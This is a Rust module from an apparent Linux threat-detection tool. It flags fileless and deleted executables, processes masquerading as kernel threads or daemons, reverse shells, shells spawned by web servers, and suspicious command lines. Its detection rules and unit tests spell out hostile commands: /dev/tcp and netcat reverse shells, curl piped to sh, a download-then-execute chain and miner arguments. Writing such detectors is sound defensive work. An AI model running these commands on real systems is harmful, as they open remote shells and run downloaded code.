//! Process anomalies: fileless and deleted executables, staging-directory binaries, kernel-thread
//! masquerading, reverse shells, web-server spawned shells and obfuscated command lines.

use std::collections::HashMap;

use super::paths::{
    file_name, in_container_rootfs, in_system_dir, memfd_name, strip_deleted, suspicious_location,
};
use super::report::{Category, Finding, Severity};
use super::{socket_inode, ProcInfo};

/// One command-line rule hit.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hit {
    pub severity: Severity,
    pub reason: String,
    pub mitre: &'static [&'static str],
}

fn hit(severity: Severity, reason: impl Into<String>, mitre: &'static [&'static str]) -> Hit {
    Hit {
        severity,
        reason: reason.into(),
        mitre,
    }
}

pub fn truncate(s: &str, n: usize) -> String {
    if s.chars().count() <= n {
        s.to_string()
    } else {
        let mut t: String = s.chars().take(n).collect();
        t.push_str("...");
        t
    }
}

pub const SHELLS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "csh", "tcsh", "fish", "busybox", "rbash",
];

pub fn is_shell(name: &str) -> bool {
    SHELLS.contains(&name)
}

pub fn is_interpreter(name: &str) -> bool {
    let n = name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    matches!(
        n,
        "python"
            | "perl"
            | "ruby"
            | "php"
            | "lua"
            | "node"
            | "tclsh"
            | "awk"
            | "gawk"
            | "pwsh"
            | "socat"
            | "telnet"
    )
}

/// Longest run of base64 alphabet characters (a hint of an embedded payload).
fn longest_b64_run(s: &str) -> usize {
    let mut best = 0;
    let mut cur = 0;
    for c in s.bytes() {
        if c.is_ascii_alphanumeric() || c == b'+' || c == b'/' || c == b'=' {
            cur += 1;
            best = best.max(cur);
        } else {
            cur = 0;
        }
    }
    best
}

/// A long run that is plausibly base64 and not a path, hash or plain identifier.
fn has_b64_blob(s: &str, min: usize) -> bool {
    s.split(|c: char| !(c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='))
        .filter(|w| w.len() >= min && !w.contains('/') || w.len() >= min * 2)
        .any(|w| {
            let lower = w.bytes().filter(u8::is_ascii_lowercase).count();
            let upper = w.bytes().filter(u8::is_ascii_uppercase).count();
            let digit = w.bytes().filter(u8::is_ascii_digit).count();
            // Hex digests are all one case; base64 mixes both cases and digits.
            lower > 4 && upper > 4 && digit > 0 && longest_b64_run(w) >= min
        })
}

fn count_hex_escapes(s: &str) -> usize {
    let b = s.as_bytes();
    (0..b.len().saturating_sub(3))
        .filter(|&i| {
            b[i] == b'\\'
                && b[i + 1] == b'x'
                && b[i + 2].is_ascii_hexdigit()
                && b[i + 3].is_ascii_hexdigit()
        })
        .count()
}

/// Rules over a command line or a shell snippet (also used for cron, systemd, udev, profiles).
pub fn cmdline_hits(cmd: &str) -> Vec<Hit> {
    let mut v = Vec::new();
    if cmd.trim().is_empty() {
        return v;
    }
    let l = cmd.to_ascii_lowercase();
    let words: Vec<&str> = l
        .split(|c: char| {
            c.is_whitespace()
                || c == ';'
                || c == '|'
                || c == '&'
                || c == '('
                || c == '`'
                || c == '\''
                || c == '"'
        })
        .filter(|w| !w.is_empty())
        .collect();
    let has_word = |w: &str| words.iter().any(|x| *x == w || file_name(x) == w);
    let piped_to_shell = [
        "| sh",
        "|sh",
        "| bash",
        "|bash",
        "| /bin/sh",
        "| /bin/bash",
        "|/bin/sh",
        "|/bin/bash",
        "| zsh",
        "| dash",
    ]
    .iter()
    .any(|p| l.contains(p));

    if l.contains("/dev/tcp/") || l.contains("/dev/udp/") {
        v.push(hit(
            Severity::Critical,
            "bash /dev/tcp network redirection (reverse shell)",
            &["T1059.004", "T1095"],
        ));
    }
    if (has_word("nc") || has_word("ncat") || has_word("netcat") || has_word("nc.traditional"))
        && (words.contains(&"-e")
            || words.contains(&"-c")
            || l.contains("--exec")
            || l.contains("--sh-exec"))
    {
        v.push(hit(
            Severity::Critical,
            "netcat with -e/-c (bind or reverse shell)",
            &["T1059.004", "T1095"],
        ));
    }
    if has_word("socat")
        && (l.contains("exec:") || l.contains("system:"))
        && (l.contains("tcp") || l.contains("udp") || l.contains("ssl"))
    {
        v.push(hit(
            Severity::High,
            "socat connecting a network stream to a program",
            &["T1059.004", "T1095"],
        ));
    }
    if has_word("mkfifo")
        && (has_word("nc")
            || has_word("ncat")
            || has_word("telnet")
            || l.contains("openssl s_client"))
    {
        v.push(hit(
            Severity::High,
            "named pipe relay to a network tool (reverse shell idiom)",
            &["T1059.004"],
        ));
    }
    if l.contains("openssl s_client") && (piped_to_shell || has_word("sh") || has_word("bash")) {
        v.push(hit(
            Severity::High,
            "openssl s_client wired to a shell (encrypted reverse shell)",
            &["T1059.004", "T1573"],
        ));
    }
    let script_flag = |interp: &[&str], flags: &[&str]| {
        interp
            .iter()
            .any(|i| words.iter().any(|w| file_name(w).starts_with(i)))
            && flags.iter().any(|f| words.contains(f))
    };
    if script_flag(
        &["python", "perl", "ruby", "php", "lua", "node"],
        &["-c", "-e", "-r", "-x"],
    ) && l.contains("socket")
        && [
            "subprocess",
            "pty",
            "exec",
            "spawn",
            "fsockopen",
            "dup2",
            "popen",
            "/bin/sh",
            "/bin/bash",
            "child_process",
        ]
        .iter()
        .any(|k| l.contains(k))
    {
        v.push(hit(
            Severity::Critical,
            "inline interpreter code opening a socket and spawning a shell",
            &["T1059.006", "T1059.004"],
        ));
    }
    if (l.contains("base64 -d")
        || l.contains("base64 --decode")
        || l.contains("base64 -D")
        || l.contains("b64decode")
        || l.contains("base64_decode")
        || l.contains("frombase64string"))
        && (piped_to_shell
            || l.contains("exec(")
            || l.contains("eval")
            || l.contains("| python")
            || l.contains("| perl"))
    {
        v.push(hit(
            Severity::High,
            "base64-decoded payload executed",
            &["T1027", "T1140", "T1059.004"],
        ));
    } else if has_b64_blob(cmd, 60) {
        v.push(hit(
            Severity::Medium,
            "long base64 blob in command line",
            &["T1027"],
        ));
    }
    if (has_word("curl") || has_word("wget") || has_word("fetch") || has_word("tftp"))
        && (piped_to_shell
            || l.contains("| python")
            || l.contains("|python")
            || l.contains("| perl"))
    {
        v.push(hit(
            Severity::High,
            "remote script downloaded and piped straight into an interpreter",
            &["T1105", "T1059.004"],
        ));
    } else if (has_word("curl") || has_word("wget"))
        && (l.contains("/tmp/") || l.contains("/dev/shm/") || l.contains("/var/tmp/"))
        && (l.contains("chmod") || l.contains("&& ./") || l.contains(";./"))
    {
        v.push(hit(
            Severity::High,
            "download to a temp directory then execute",
            &["T1105"],
        ));
    }
    if count_hex_escapes(cmd) >= 8 {
        v.push(hit(
            Severity::Medium,
            "many \\x hex escapes (obfuscated payload)",
            &["T1027"],
        ));
    }
    if l.contains("stratum+tcp://")
        || l.contains("stratum+ssl://")
        || l.contains("--donate-level")
        || l.contains("--cpu-max-threads-hint")
        || l.contains("--randomx")
    {
        v.push(hit(
            Severity::High,
            "cryptocurrency miner arguments",
            &["T1496"],
        ));
    }
    if l.contains("ld_preload=") {
        v.push(hit(
            Severity::High,
            "LD_PRELOAD set on the command line",
            &["T1574.006"],
        ));
    }
    if l.contains("unset histfile")
        || l.contains("histfile=/dev/null")
        || l.contains("history -c")
        || l.contains("histsize=0")
    {
        v.push(hit(
            Severity::Medium,
            "shell history suppression",
            &["T1070.003"],
        ));
    }
    if l.contains("chattr +i") || l.contains("chattr +a") {
        v.push(hit(
            Severity::Medium,
            "immutable attribute set (prevents removal)",
            &["T1222.002"],
        ));
    }
    if l.contains("setenforce 0")
        || l.contains("ufw disable")
        || l.contains("iptables -f")
        || l.contains("systemctl stop auditd")
        || l.contains("auditctl -e 0")
        || l.contains("systemctl stop firewalld")
        || l.contains("systemctl disable firewalld")
    {
        v.push(hit(
            Severity::Medium,
            "security control disabled",
            &["T1562.001", "T1562.004"],
        ));
    }
    if (l.contains("/etc/shadow") || l.contains("/etc/passwd"))
        && (l.contains(">>") || l.contains("echo "))
    {
        v.push(hit(
            Severity::High,
            "writes to the account database",
            &["T1136.001", "T1098"],
        ));
    }
    v
}

/// Process names of web, application and database servers: a shell child means RCE or a webshell.
const SERVER_PARENTS: &[&str] = &[
    "nginx",
    "apache2",
    "httpd",
    "lighttpd",
    "php-fpm",
    "caddy",
    "uwsgi",
    "gunicorn",
    "tomcat",
    "catalina",
    "jboss",
    "weblogic",
    "w3wp",
    "openresty",
    "traefik",
    "haproxy",
    "mysqld",
    "mariadbd",
    "postgres",
    "redis-server",
    "mongod",
    "memcached",
    "elasticsearch",
    "confluence",
    "jira",
    "unicorn",
    "puma",
    "hhvm",
];

pub fn is_server_process(comm: &str, cmdline: &str) -> bool {
    let c = comm.to_ascii_lowercase();
    if SERVER_PARENTS
        .iter()
        .any(|s| c == *s || c.starts_with(&format!("{s}-")) || (s.len() > 5 && c.starts_with(s)))
    {
        return true;
    }
    if c == "java" {
        let l = cmdline.to_ascii_lowercase();
        return [
            "catalina",
            "tomcat",
            "jboss",
            "wildfly",
            "weblogic",
            "websphere",
            "confluence",
            "atlassian",
            "solr",
            "elasticsearch",
        ]
        .iter()
        .any(|k| l.contains(k));
    }
    false
}

/// Children a compromised server spawns first (shells, recon, download tools).
fn rce_child(name: &str) -> bool {
    is_shell(name)
        || matches!(
            name,
            "id" | "whoami"
                | "uname"
                | "wget"
                | "curl"
                | "nc"
                | "ncat"
                | "netcat"
                | "socat"
                | "telnet"
                | "base64"
                | "python"
                | "python3"
                | "perl"
                | "hostname"
                | "ifconfig"
        )
}

/// Kernel-thread name patterns (without brackets).
const KTHREAD_PREFIXES: &[&str] = &[
    "kworker/",
    "ksoftirqd/",
    "migration/",
    "rcu_",
    "kthreadd",
    "watchdog/",
    "watchdogd",
    "kswapd",
    "kblockd",
    "khugepaged",
    "kauditd",
    "jbd2/",
    "irq/",
    "cpuhp/",
    "kdevtmpfs",
    "netns",
    "writeback",
    "kcompactd",
    "ksmd",
    "oom_reaper",
    "kintegrityd",
    "edac-poller",
    "scsi_eh_",
    "kthrotld",
    "ipv6_addrconf",
    "kstrp",
    "khungtaskd",
    "kpsmoused",
    "idle_inject/",
    "ext4-rsv-conver",
    "xfsaild/",
    "card0-crtc",
    "kmpath_rdacd",
    "devfreq_wq",
    "ttm_swap",
    "mm_percpu_wq",
    "events",
    "kaluad",
];

pub fn looks_like_kthread(name: &str) -> bool {
    let n = name.trim_start_matches('[').trim_end_matches(']');
    KTHREAD_PREFIXES.iter().any(|p| n.starts_with(p))
}

/// System daemons malware likes to impersonate.
const DAEMON_NAMES: &[&str] = &[
    "sshd",
    "cron",
    "crond",
    "atd",
    "systemd",
    "systemd-journald",
    "systemd-logind",
    "systemd-udevd",
    "systemd-resolved",
    "rsyslogd",
    "syslogd",
    "dbus-daemon",
    "agetty",
    "init",
    "udevd",
    "polkitd",
    "auditd",
    "containerd",
    "dockerd",
    "snapd",
    "networkmanager",
    "chronyd",
    "ntpd",
    "irqbalance",
    "accounts-daemon",
    "udisksd",
    "upowerd",
    "gdm",
    "login",
];

/// memfd names used by legitimate software.
const BENIGN_MEMFD: &[&str] = &[
    "runc_cloned",
    "jit",
    "doublemapper",
    "wasm",
    "dotnet",
    "mono",
    "crun",
    "libcrun",
    "libffi",
    "pulseaudio",
    "wayland",
    "shm",
];

pub fn benign_memfd(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    BENIGN_MEMFD.iter().any(|b| n.contains(b))
}

/// Context the process rules need beyond the process itself.
pub struct ProcCtx<'a> {
    pub parent: Option<&'a ProcInfo>,
    /// Socket inode -> "proto local -> remote" for TCP/UDP sockets.
    pub inet: &'a HashMap<u64, String>,
}

pub fn analyze(p: &ProcInfo, ctx: &ProcCtx) -> Vec<Finding> {
    let mut out = Vec::new();
    let name = p.name().to_string();
    let base = |sev, title: &str| {
        let mut f = Finding::new(sev, Category::Process, title).proc(p.pid, &name);
        if let Some(e) = &p.exe {
            f = f.path(e.clone());
        }
        f.detail(format!("cmdline: {}", truncate(&p.cmdline(), 300)))
    };

    // Kernel-thread masquerade: a userland task wearing a kernel-thread name.
    if !p.kthread {
        let argv0 = p.argv.first().map(String::as_str).unwrap_or("");
        let bracketed = argv0.starts_with('[') && argv0.trim_end().ends_with(']');
        if looks_like_kthread(&p.comm) || looks_like_kthread(argv0) || bracketed {
            let sev = if looks_like_kthread(&p.comm) || looks_like_kthread(argv0) {
                Severity::Critical
            } else {
                Severity::High
            };
            out.push(
                base(sev, "Userland process disguised as a kernel thread")
                    .detail("name looks like a kernel thread but PF_KTHREAD is not set and the task has a user address space")
                    .mitre(&["T1036.004", "T1036.005"]),
            );
        }
    }

    if let Some(exe) = &p.exe {
        let (path, deleted) = strip_deleted(exe);
        if let Some(mname) = memfd_name(exe) {
            if !benign_memfd(mname) {
                out.push(
                    base(
                        Severity::Critical,
                        "Process executing from an anonymous memfd (fileless ELF)",
                    )
                    .detail(format!("memfd name: '{mname}'"))
                    .detail("the program image only exists in RAM; dump it via /proc/<pid>/exe")
                    .mitre(&["T1620", "T1027.011"]),
                );
            }
        } else if deleted {
            if p.exe_replaced && in_system_dir(path) {
                out.push(
                    base(Severity::Low, "Running binary was replaced on disk")
                        .detail("typical after a package upgrade; restart the service")
                        .mitre(&["T1070.004"]),
                );
            } else {
                let sev = if suspicious_location(path).is_some() {
                    Severity::Critical
                } else {
                    Severity::High
                };
                out.push(
                    base(sev, "Process running from a deleted executable")
                        .detail(
                            "the file was removed after launch; recover it from /proc/<pid>/exe",
                        )
                        .mitre(&["T1070.004"]),
                );
            }
        }
        if memfd_name(exe).is_none() {
            if let Some(why) = suspicious_location(path) {
                let sev = if path.starts_with("/dev/") || path.starts_with("/run/shm/") {
                    Severity::Critical
                } else {
                    Severity::High
                };
                out.push(
                    base(sev, "Executable running from a suspicious location")
                        .detail(why)
                        .mitre(&["T1105", "T1564.001"]),
                );
            }
            let comm_l = p.comm.to_ascii_lowercase();
            if DAEMON_NAMES.contains(&comm_l.as_str())
                && !in_system_dir(path)
                && !in_container_rootfs(path)
                && !p.in_container()
                && !path.starts_with("/usr/local/")
            {
                out.push(
                    base(
                        Severity::High,
                        "System daemon name on a binary outside system directories",
                    )
                    .detail(format!("'{}' would normally live under /usr", p.comm))
                    .mitre(&["T1036.005"]),
                );
            }
        }
    }

    // Shells and interpreters whose stdio is a network socket: reverse/bind shell.
    let stdio_inet: Vec<&String> = p
        .stdio
        .iter()
        .take(2)
        .flatten()
        .filter_map(|l| socket_inode(l))
        .filter_map(|i| ctx.inet.get(&i))
        .collect();
    if !stdio_inet.is_empty() {
        let n = name.to_ascii_lowercase();
        let argv0 = p
            .argv
            .first()
            .map(|a| file_name(a).to_ascii_lowercase())
            .unwrap_or_default();
        let shellish = is_shell(&n) || is_shell(&argv0);
        if shellish || is_interpreter(&n) {
            let parent_sshd = ctx.parent.is_some_and(|pp| pp.comm == "sshd");
            let sev = if parent_sshd {
                Severity::Medium
            } else if shellish {
                Severity::Critical
            } else {
                Severity::High
            };
            let mut f = base(
                sev,
                if shellish {
                    "Shell with network socket as stdin/stdout (reverse or bind shell)"
                } else {
                    "Interpreter with network socket as stdin/stdout"
                },
            )
            .mitre(&["T1059.004", "T1095"]);
            for s in stdio_inet {
                f = f.detail(format!("socket: {s}"));
            }
            out.push(f);
        }
    }

    // Suspicious parent/child pairs.
    if let Some(pp) = ctx.parent {
        let child = name.to_ascii_lowercase();
        if is_server_process(&pp.comm, &pp.cmdline()) && rce_child(&child) {
            out.push(
                base(
                    Severity::High,
                    "Web/database server spawned a shell or recon tool",
                )
                .detail(format!("parent: {} [pid {}]", pp.name(), pp.pid))
                .mitre(&["T1505.003", "T1190", "T1059.004"]),
            );
        }
    }

    // Command line content.
    let cmd = p.cmdline();
    for h in cmdline_hits(&cmd) {
        out.push(
            base(
                h.severity,
                &format!("Suspicious command line: {}", h.reason),
            )
            .mitre(h.mitre),
        );
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn proc(comm: &str, argv: &[&str], exe: Option<&str>) -> ProcInfo {
        ProcInfo {
            pid: 100,
            ppid: 1,
            comm: comm.into(),
            argv: argv.iter().map(|s| s.to_string()).collect(),
            exe: exe.map(String::from),
            ..Default::default()
        }
    }

    fn run(p: &ProcInfo) -> Vec<Finding> {
        let inet = HashMap::new();
        analyze(
            p,
            &ProcCtx {
                parent: None,
                inet: &inet,
            },
        )
    }

    fn titles(v: &[Finding]) -> Vec<String> {
        v.iter().map(|f| f.title.clone()).collect()
    }

    #[test]
    fn clean_process_is_clean() {
        let p = proc("sshd", &["/usr/sbin/sshd", "-D"], Some("/usr/sbin/sshd"));
        assert!(run(&p).is_empty(), "{:?}", titles(&run(&p)));
    }

    #[test]
    fn real_kthread_ignored_fake_flagged() {
        let mut k = proc("kworker/0:1", &[], None);
        k.kthread = true;
        assert!(run(&k).is_empty());
        let fake = proc("kworker/0:1", &["[kworker/0:1]"], Some("/usr/bin/.x/k"));
        let f = run(&fake);
        assert!(f
            .iter()
            .any(|f| f.severity == Severity::Critical && f.title.contains("kernel thread")));
        let bracket = proc("foo", &["[foo]"], Some("/usr/bin/foo"));
        assert!(run(&bracket)
            .iter()
            .any(|f| f.severity == Severity::High && f.title.contains("kernel thread")));
    }

    #[test]
    fn memfd_and_deleted() {
        let m = proc("x", &["x"], Some("/memfd: (deleted)"));
        assert!(run(&m)
            .iter()
            .any(|f| f.severity == Severity::Critical && f.title.contains("memfd")));
        let runc = proc(
            "runc",
            &["runc"],
            Some("/memfd:runc_cloned:/proc/self/exe (deleted)"),
        );
        assert!(run(&runc).is_empty());
        let d = proc("x", &["x"], Some("/tmp/x (deleted)"));
        let f = run(&d);
        assert!(f
            .iter()
            .any(|f| f.severity == Severity::Critical && f.title.contains("deleted")));
        assert!(f.iter().any(|f| f.title.contains("suspicious location")));
        let mut up = proc("nginx", &["nginx"], Some("/usr/sbin/nginx (deleted)"));
        up.exe_replaced = true;
        assert_eq!(
            run(&up).iter().map(|f| f.severity).max(),
            Some(Severity::Low)
        );
    }

    #[test]
    fn daemon_masquerade() {
        let p = proc("sshd", &["sshd"], Some("/home/bob/sshd"));
        assert!(run(&p).iter().any(|f| f.title.contains("System daemon")));
        let ok = proc("sshd", &["sshd"], Some("/usr/local/sbin/sshd"));
        assert!(run(&ok).is_empty());
    }

    #[test]
    fn reverse_shell_stdio() {
        let mut p = proc("bash", &["bash", "-i"], Some("/usr/bin/bash"));
        p.stdio = [
            Some("socket:[77]".into()),
            Some("socket:[77]".into()),
            Some("socket:[77]".into()),
        ];
        let mut inet = HashMap::new();
        inet.insert(77u64, "tcp 10.0.0.5:51000 -> 1.2.3.4:4444".to_string());
        let f = analyze(
            &p,
            &ProcCtx {
                parent: None,
                inet: &inet,
            },
        );
        assert!(f
            .iter()
            .any(|f| f.severity == Severity::Critical && f.title.contains("reverse")));
        // A journald unix socket on stdout is not a network socket.
        let empty = HashMap::new();
        assert!(analyze(
            &p,
            &ProcCtx {
                parent: None,
                inet: &empty
            }
        )
        .is_empty());
    }

    #[test]
    fn webserver_child() {
        let parent = proc(
            "php-fpm8.2",
            &["php-fpm: pool www"],
            Some("/usr/sbin/php-fpm8.2"),
        );
        let child = proc("sh", &["sh", "-c", "id"], Some("/usr/bin/dash"));
        let inet = HashMap::new();
        let f = analyze(
            &child,
            &ProcCtx {
                parent: Some(&parent),
                inet: &inet,
            },
        );
        assert!(f.iter().any(|f| f.title.contains("Web/database")));
        assert!(is_server_process(
            "java",
            "java -Dcatalina.home=/opt/tomcat"
        ));
        assert!(!is_server_process("java", "java -jar app.jar"));
        assert!(!is_server_process("bash", ""));
    }

    #[test]
    fn cmdline_rules() {
        let sev = |c: &str| cmdline_hits(c).iter().map(|h| h.severity).max();
        assert_eq!(
            sev("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
            Some(Severity::Critical)
        );
        assert_eq!(sev("nc -e /bin/sh 1.2.3.4 80"), Some(Severity::Critical));
        assert_eq!(
            sev("python3 -c import socket,subprocess,os;s=socket.socket()"),
            Some(Severity::Critical)
        );
        assert_eq!(
            sev("echo ZWNobyBoaQ== | base64 -d | bash"),
            Some(Severity::High)
        );
        assert_eq!(sev("curl -fsSL http://x.y/i.sh | sh"), Some(Severity::High));
        assert_eq!(
            sev("wget http://1.2.3.4/a -O /tmp/a && chmod +x /tmp/a && /tmp/a"),
            Some(Severity::High)
        );
        assert_eq!(
            sev("./xmrig -o stratum+tcp://pool:3333"),
            Some(Severity::High)
        );
        assert_eq!(sev("export HISTFILE=/dev/null"), Some(Severity::Medium));
        assert!(sev("perl -e 'print \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\"'").is_some());
        let blob = format!(
            "python3 -c {}",
            "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2YgYmFzZTY0IGJsb2JzIGluIGNvbW1hbmQgbGluZXM="
        );
        assert_eq!(sev(&blob), Some(Severity::Medium));
    }

    #[test]
    fn cmdline_false_positives() {
        for c in [
            "/usr/bin/python3 /usr/bin/unattended-upgrade",
            "/usr/lib/systemd/systemd --user",
            "sha256sum e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "/usr/bin/gnome-shell",
            "nc -l 8080",
            "/usr/bin/curl -o /tmp/file https://example.com/file",
            "/opt/google/chrome/chrome --type=renderer --field-trial-handle=3,i,8215395849587324975,1426128271582153311,262144 --variations-seed-version=20251010-180037.443000",
        ] {
            assert!(cmdline_hits(c).is_empty(), "{c}: {:?}", cmdline_hits(c));
        }
    }

    #[test]
    fn interpreters_and_kthread_names() {
        assert!(is_interpreter("python3.11"));
        assert!(is_interpreter("perl"));
        assert!(!is_interpreter("pythonista"));
        assert!(looks_like_kthread("[kworker/u8:2]"));
        assert!(looks_like_kthread("ksoftirqd/0"));
        assert!(!looks_like_kthread("bash"));
    }
}
